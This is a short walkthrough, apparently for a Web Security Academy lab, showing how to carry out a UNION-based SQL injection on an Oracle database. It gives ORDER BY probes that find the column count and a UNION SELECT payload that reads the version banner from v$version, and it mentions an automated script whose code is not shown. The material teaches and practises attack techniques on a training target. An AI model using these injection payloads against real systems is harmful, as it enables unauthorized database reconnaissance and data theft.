# SQL Injection Lab 03 - SQL injection attack, querying the database type and version on Oracle

## Manual Solution

### 1. What is UNION
- The UNION operator is used to combine the result-set of two or more SELECT statements. The UNION operator has a few rules:
   - Each SELECT statement within UNION must return the same number of columns.
   - The columns must have compatible data types.
   - The column order must be the same in every SELECT statement.

### 2. Access the lab in Web Security Academy

### 3. Determine the number of columns for UNION attack
- The ORDER BY keyword sorts the data based on the column you specify. If I use ORDER BY 3, the SQL query sorts the data by the third column. However, if the table consists of only two columns, the query will throw an error
- Use ORDER BY to find column count
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: Error (confirms 2 columns)

### 4. Extract database version
- Payload: `/filter?category=Gifts' UNION SELECT NULL,banner FROM v$version--`
   - This URL executes the following SQL query
   ```sql
   SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,banner FROM v$version--'
   ```
   - Result: Database version information displayed


## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_03.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

